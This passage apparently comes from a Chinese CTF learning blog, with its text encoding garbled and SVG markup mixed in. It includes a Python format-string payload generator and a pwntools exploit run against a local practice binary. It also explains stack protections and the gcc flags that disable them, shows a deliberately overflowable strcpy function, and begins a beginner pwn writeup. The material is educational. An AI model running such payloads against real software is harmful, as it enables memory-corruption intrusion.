<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/>
<path stroke-width="1" id="E1-MJMAIN-34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="849" y="583"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1117" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="2118" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="2621" y="0"/>
 <use xlink:href="#E1-MJMATHI-64" x="3151" y="0"/>
 <use xlink:href="#E1-MJMAIN-34" x="3674" y="0"/>
<g transform="translate(4175,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>n&#x27;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥ä¾æ¬¡è¿›è¡Œè®¡ç®—ã€‚è¿™é‡Œç»™å‡ºä¸€ä¸ªåŸºæœ¬çš„æ„é€ ï¼Œå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br>payload = fmt_str(<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x0804A028</span>,<span class="hljs-number">0x12345678</span>)<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­æ¯ä¸ªå‚æ•°çš„å«ä¹‰åŸºæœ¬å¦‚ä¸‹</p>
<ul>
<li>offsetè¡¨ç¤ºè¦è¦†ç›–çš„åœ°å€æœ€åˆçš„åç§»</li>
<li>sizeè¡¨ç¤ºæœºå™¨å­—é•¿</li>
<li>addrè¡¨ç¤ºå°†è¦è¦†ç›–çš„åœ°å€ã€‚</li>
<li>targetè¡¨ç¤ºæˆ‘ä»¬è¦è¦†ç›–ä¸ºçš„ç›®çš„å˜é‡å€¼ã€‚</li>
</ul>
<p>ç›¸åº”çš„exploitå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forb</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br>    <span class="hljs-built_in">print</span> payload<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">âœ  overwrite git:(master) âœ— python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./overwrite&#x27;</span>: pid <span class="hljs-number">78547</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="4.073ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 1753.5 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hhn%222c%7</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-68" x="576" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="1153" y="0"/>
</g>
</svg>hhn%222c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="4.073ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 1753.5 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hhn%222c%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-68" x="576" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="1153" y="0"/>
</g>
</svg>hhn<br>[*] Process <span class="hljs-string">&#x27;./overwrite&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">78547</span>)<br><span class="hljs-number">0xfff6f9bc</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             ï¿½                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             ~modified b <span class="hljs-keyword">for</span> a big number!<br></code></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨%nåˆ†åˆ«å¯¹æ¯ä¸ªåœ°å€è¿›è¡Œå†™å…¥ï¼Œä¹Ÿå¯ä»¥å¾—åˆ°å¯¹åº”çš„ç­”æ¡ˆï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬å†™å…¥çš„å˜é‡éƒ½åªä¼šå½±å“ç”±å…¶å¼€å§‹çš„å››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æœ€åä¸€ä¸ªå˜é‡å†™å®Œä¹‹åï¼Œæˆ‘ä»¬å¯èƒ½ä¼šä¿®æ”¹ä¹‹åçš„ä¸‰ä¸ªå­—èŠ‚ï¼Œå¦‚æœè¿™ä¸‰ä¸ªå­—èŠ‚æ¯”è¾ƒé‡è¦çš„è¯ï¼Œç¨‹åºå°±æœ‰å¯èƒ½å› æ­¤å´©æºƒã€‚è€Œé‡‡ç”¨%hhnåˆ™ä¸ä¼šæœ‰è¿™æ ·çš„é—®é¢˜ï¼Œå› ä¸ºè¿™æ ·åªä¼šä¿®æ”¹ç›¸åº”åœ°å€çš„ä¸€ä¸ªå­—èŠ‚ã€‚</p>
]]></content>
      <tags>
        <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¼“å†²åŒºä¿æŠ¤æœºåˆ¶</title>
    <url>/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>ä¸ºäº†æ›´å¥½åœ°å¯¹ç¼“å†²åŒºè¿›è¡Œåˆ©ç”¨ï¼Œååˆ†æœ‰å¿…è¦äº†è§£ä¸€ä¸‹checksecæ‰€æ£€æŸ¥å‡ºçš„æ¼æ´ç¼“è§£æªæ–½éƒ½æ„å‘³ç€ä»€ä¹ˆ</p>
<p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191658.png"></p>
<p>å¦‚å›¾ä¸Šæ‰€ç¤ºï¼ŒRELROã€Stackã€NXã€PIEå››ç§ä¿æŠ¤æœºåˆ¶ï¼Œä¸‹æ–¹ä»‹ç»æ—¶ï¼Œæ‹¬å·é‡Œçš„æ˜¯åœ¨Windowsç³»ç»Ÿä¸­çš„åç§°</p>
<p>ä»¥ä¸‹ä¸»è¦æ¥æºäºã€Šä»0åˆ°1CTFeræˆé•¿ä¹‹è·¯ã€‹</p>
<h3 id="ä¸€ã€NX-DEP"><a href="#ä¸€ã€NX-DEP" class="headerlink" title="ä¸€ã€NX(DEP)"></a>ä¸€ã€NX(DEP)</h3><p>NXå³æ˜¯No-executeï¼Œä¸å¯æ‰§è¡Œã€‚åŸç†æ˜¯é€šè¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å†…å­˜ä¿æŠ¤å•å…ƒæœºåˆ¶ï¼ˆMPUï¼‰å¯¹ç¨‹åºå†…å­˜æŒ‰é¡µçš„ç²’åº¦è¿›è¡Œæƒé™è®¾ç½®ï¼Œå…¶åŸºæœ¬è§„åˆ™ä¸º<strong>å¯å†™æƒé™ä¸å¯æ‰§è¡Œæƒé™äº’æ–¥</strong>ã€‚å› æ­¤å¼€å¯äº†NXçš„ç¨‹åºä»£è¡¨ç€å †æ ˆä¸Šå†™å…¥çš„ä»£ç æ•°æ®å°†ä¸å¯è¢«æ‰§è¡Œï¼Œä¹Ÿå°±æ— æ³•ç›´æ¥é€šè¿‡æº¢å‡ºå†™å…¥shellcodeè€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>æ‰€æœ‰å¯ä»¥è¢«ä¿®æ”¹å†™å…¥çš„æ•°æ®çš„å†…å­˜éƒ½ä¸å¯æ‰§è¡Œï¼Œæ‰€æœ‰å¯æ‰§è¡Œçš„ä»£ç æ•°æ®éƒ½æ˜¯ä¸å¯ä¿®æ”¹çš„ã€‚è¿™å°±æ˜¯å¯æ‰§è¡Œæƒé™ä¸å¯å†™æƒé™äº’æ–¥</p>
<p>GCCç¼–å†™ç¨‹åºé»˜è®¤å¼€å¯NXï¼Œå…³é—­æ–¹æ³•æ˜¯åœ¨ç¼–è¯‘æ˜¯åŠ å…¥**-z execstackå‚æ•°**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z execstack -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="äºŒã€Stack-Canary"><a href="#äºŒã€Stack-Canary" class="headerlink" title="äºŒã€Stack Canary"></a>äºŒã€Stack Canary</h3><p>Stack Canaryä¿æŠ¤ä¸€ç§é’ˆå¯¹æ ˆæº¢å‡ºæ”»å‡»è€Œè®¾è®¡çš„ä¿æŠ¤æœºåˆ¶ã€‚å½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œï¼Œå› æ­¤Stack Canaryä¼šåœ¨å‡½æ•°å¼€å§‹æ‰§è¡Œå‰ï¼Œåœ¨è¿”å›åœ°å€å‰å†™å…¥ä¸€ä¸ªå­—é•¿çš„éšæœºæ•°æ®ï¼ˆå¯ä»¥ç§°è¿™ä¸ªæ•°æ®ä¸ºcanaryï¼Œåœ¨Windowsä¸‹æ˜¯cookieï¼‰ï¼Œä¹‹åå¯ä»¥åœ¨å‡½æ•°è¿”å›å‰è¿›è¡Œæ£€éªŒéšæœºæ•°æ®æ˜¯å¦è¢«æ›´æ”¹ï¼Œå¦‚æœå‘ç”Ÿæ›´æ”¹å°†ç›´æ¥ç»ˆæ­¢ç¨‹åºè¿›è¡Œä¿æŠ¤ã€‚</p>
<p>GCCç¼–å†™ç¨‹åºé»˜è®¤å¼€å¯Stack Canaryï¼Œå…³é—­æ–¹æ³•æ˜¯åœ¨ç¼–è¯‘æ—¶åŠ å…¥**-fno-stack-protectorå‚æ•°**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰ã€PIE"><a href="#ä¸‰ã€PIE" class="headerlink" title="ä¸‰ã€PIE"></a>ä¸‰ã€PIE</h3><p>åœ¨ä»‹ç»PIEå‰ï¼Œè¦å…ˆä»‹ç»ASLRå³Address Space Layout Randomizationï¼Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ã€‚ASLRæ˜¯ç³»ç»Ÿç­‰çº§çš„ä¿æŠ¤æœºåˆ¶ï¼Œåªæœ‰åœ¨å¼€å¯äº†ASLRåPIEæ‰èƒ½ç”Ÿæ•ˆã€‚è€ŒASLRçš„ç›®çš„æ˜¯å°†ç¨‹åºçš„å †æ ˆåœ°å€å’ŒåŠ¨æ€é“¾æ¥åº“ï¼ˆæˆ–ç§°ä¸ºå…±äº«åº“ï¼‰çš„åŠ è½½åŸºå€è¿›è¡Œä¸€å®šçš„éšæœºåŒ–ï¼Œè¿™äº›åœ°å€ä¹‹é—´æ˜¯ä¸å¯è¯»å†™æ‰§è¡Œçš„æœªæ˜ å°„å†…å­˜ã€‚</p>
<p>å…³é—­ASLRå…³é—­æ–¹å¼æ˜¯ä¿®æ”¹**/proc/sys/kernel/randomize_va_space**æ–‡ä»¶ä¸º0</p>
<p>PIEçš„ç›®çš„åˆ™æ˜¯è®©å¯æ‰§è¡Œç¨‹åºELFæ–‡ä»¶çš„åŸºå€è¿›è¡ŒéšæœºåŒ–åŠ è½½ï¼ˆè´Ÿè´£ä»£ç æ®µå’Œæ•°æ®æ®µçš„éšæœºåŒ–ï¼‰ï¼Œä»è€Œä½¿å¾—æ”»å‡»è€…éš¾ä»¥çŸ¥é“ç¨‹åºçš„å†…å­˜ç»“æ„ï¼Œä¸ASLRç›¸äº’é…åˆã€‚</p>
<p>GCCç¼–å†™ç¨‹åºå¼€å¯æ–¹æ³•æ˜¯åŠ å…¥**-fpic -pieå‚æ•°<strong>ã€‚è¾ƒæ–°ç‰ˆæœ¬çš„GCCé»˜è®¤å¼€å¯PIEï¼Œå¯ä»¥è®¾ç½®</strong>-no-pie**å…³é—­</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fpic -pie -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="å››ã€Full-Relro"><a href="#å››ã€Full-Relro" class="headerlink" title="å››ã€Full Relro"></a>å››ã€Full Relro</h3><p>Full Relro ä¿æŠ¤æªæ–½ä¸Linuxä¸‹çš„Lazy Bindingæœºåˆ¶æœ‰å…³ï¼Œä¸»è¦ä½œç”¨æ˜¯è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œç¦æ­¢.GOT.PLTè¡¨å’Œå…¶ä»–ä¸€äº›ç›¸å…³å†…å­˜çš„è¯»å†™ï¼Œä»è€Œé˜»æ­¢æ”»å‡»è€…ç›´æ¥è¿›è¡Œä¿®æ”¹ç¨‹åºæ‰€è¦æ‰§è¡Œçš„å‡½æ•°</p>
<ul>
<li>RELROé˜²å¾¡ç­–ç•¥ï¼š<ul>
<li>ä¸ºNO RELROçš„æ—¶å€™ï¼Œ<code>init.array</code>ã€<code>fini.array</code>ã€<code>got.plt</code>å‡å¯è¯»å¯å†™</li>
<li>ä¸ºPARTIAL RELROçš„æ—¶å€™ï¼Œ<code>init.array</code>ã€<code>fini.array</code>å¯è¯»ä¸å¯å†™ï¼Œ<code>got.plt</code>å¯è¯»å¯å†™</li>
<li>ä¸ºFULL RELROæ—¶ï¼Œ<code>init.array</code>ã€<code>fini.array</code>ã€<code>got.plt</code>å‡å¯è¯»ä¸å¯å†™ã€‚</li>
</ul>
</li>
</ul>
<p>GCCå¼€å¯Full Relro çš„æ–¹æ³•æ˜¯åŠ å…¥**-z relroå‚æ•°**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z relro -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="äº”ã€Fortify"><a href="#äº”ã€Fortify" class="headerlink" title="äº”ã€Fortify"></a>äº”ã€Fortify</h3><p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191855.png"></p>
<p>è¿™éƒ¨åˆ†è½¬è½½è‡ª<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksecåŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶/</a></p>
<p>FORTIFY_SOURCE æœºåˆ¶å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æœ‰ä¸¤ä¸ªé™åˆ¶</p>
<p> ï¼ˆ1ï¼‰åŒ…å«%nçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸èƒ½ä½äºç¨‹åºå†…å­˜ä¸­çš„å¯å†™åœ°å€ã€‚</p>
<p>ï¼ˆ2ï¼‰å½“ä½¿ç”¨ä½ç½®å‚æ•°æ—¶ï¼Œå¿…é¡»ä½¿ç”¨èŒƒå›´å†…çš„æ‰€æœ‰å‚æ•°ã€‚</p>
<p>æ‰€ä»¥å¦‚æœè¦ä½¿ç”¨%7$xï¼Œä½ å¿…é¡»åŒæ—¶ä½¿ç”¨1,2,3,4,5å’Œ6</p>
<p>å½“è¿›å…¥åˆ°gdbä¸­è¿›è¡Œchecksecæ£€æŸ¥æ–‡ä»¶ä¼šå‘ç°å¤šäº†ä¸€ä¸ªä¿æŠ¤æªæ–½Fortifyï¼Œè¿™æ˜¯ä¸€ç§æ¯”è¾ƒå°‘è§çš„ä¿æŠ¤æªæ–½ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»</p>
<p>ä¸¾ä¸ªä¾‹å­å¯èƒ½ç®€å•æ˜äº†ä¸€äº›ï¼š<br>ä¸€æ®µç®€å•çš„å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„Cä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span> </span>&#123;<br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];<br>        <span class="hljs-built_in">strcpy</span>(buf, s);<br>        <span class="hljs-comment">/* Don&#x27;t allow gcc to optimise away the buf */</span><br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> :: <span class="hljs-string">&quot;m&quot;</span> (buf))</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç”¨åŒ…å«å‚æ•°-U_FORTIFY_SOURCEç¼–è¯‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048450 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; å°†0x118å­˜å‚¨åˆ°æ ˆä¸Š<br>  mov    0x8(%ebp),%eax     ; å°†ç›®æ ‡å‚æ•°è½½å…¥eax<br>  mov    %eax,0x4(%esp)     ; ä¿å­˜ç›®æ ‡å‚æ•°<br>  lea    -0x108(%ebp),%eax  ; æ•°ç»„buf<br>  mov    %eax,(%esp)        ; ä¿å­˜<br>  call   8048320 &lt;strcpy@plt&gt;<br><br>  leave                     ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>ç”¨åŒ…å«å‚æ•°-D_FORTIFY_SOURCE=2ç¼–è¯‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048470 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; <br>  movl   $0x100,0x8(%esp)   ; æŠŠ0x100å½“ä½œç›®æ ‡å‚æ•°ä¿å­˜<br>  mov    0x8(%ebp),%eax     ; <br>  mov    %eax,0x4(%esp)     ; <br>  lea    -0x108(%ebp),%eax  ; <br>  mov    %eax,(%esp)        ; <br>  call   8048370 &lt;__strcpy_chk@plt&gt;<br><br>  leave                      ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°gccç”Ÿæˆäº†ä¸€äº›é™„åŠ ä»£ç ï¼Œé€šè¿‡å¯¹æ•°ç»„å¤§å°çš„åˆ¤æ–­æ›¿æ¢strcpy, memcpy, memsetç­‰å‡½æ•°åï¼Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨ã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹é¢˜wp</title>
    <url>/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/</url>
    <content><![CDATA[<h3 id="ä¸€ã€get-shell"><a href="#ä¸€ã€get-shell" class="headerlink" title="ä¸€ã€get_shell"></a>ä¸€ã€get_shell</h3><p>é¢˜ç›®æ‰€ç»™çš„é™„ä»¶å¹¶æ— ä½œç”¨ï¼Œç›´æ¥è¿›å…¥è™šæ‹Ÿæœºä¸­ç”¨ncè¿æ¥æ‰€ç»™çš„ipï¼Œå³å¯è·å–flag</p>
<img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQå›¾ç‰‡20210316210045.png" style="zoom: 80%;">

<h3 id="äºŒã€CGfsb"><a href="#äºŒã€CGfsb" class="headerlink" title="äºŒã€CGfsb"></a>äºŒã€CGfsb</h3><p>checksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æªæ–½ä»¥åŠç¡®è®¤æ–‡ä»¶æ˜¯</p>
<h3 id="ä¸‰ã€when-did-you-born"><a href="#ä¸‰ã€when-did-you-born" class="headerlink" title="ä¸‰ã€when_did_you_born"></a>ä¸‰ã€when_did_you_born</h3><p>checksecä¸€ä¸‹é™„ä»¶ï¼Œå‘ç°æ˜¯64ä½æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›å¼€å¯çš„ä¿æŠ¤æªæ–½ï¼Œå…·ä½“çš„æ‹–å…¥idaè¿›è¡Œåˆ†æ</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323214845.png"></p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323215315.png"></p>
<p>ç¨‹åºå¾ˆç®€å•ï¼Œå°±æ˜¯è¦ä½ è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œä»£è¡¨ä½ çš„å‡ºç”Ÿå¹´é¾„ï¼Œä½†æ˜¯ä¸€å¼€å§‹å¹¶ä¸èƒ½è¾“å…¥1926ï¼Œç„¶åç¨‹åºå¾€ä¸‹ç»§ç»­è¿è¡Œï¼Œä¼šå‘ç°ï¼Œåªæœ‰ä½ è¾“å…¥çš„å‡ºç”Ÿå¹´ä»½æ˜¯1926æ‰èƒ½è·å¾—flagï¼Œå¾ˆæ˜æ˜¾çš„æº¢å‡ºè¦†ç›–äº†ï¼Œå¾€å‰æ‰¾ï¼Œget(&amp;v4)æ— é™åˆ¶çš„è¾“å…¥ï¼Œå¯ä»¥é€ æˆæº¢å‡ºè€Œè¦†ç›–v5çš„å€¼å˜æˆ1926è€Œå¾—åˆ°flagï¼Œexpå¦‚ä¸‹</p>
<p><img src="/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/QQ%E5%9B%BE%E7%89%8720210323220128.png"></p>
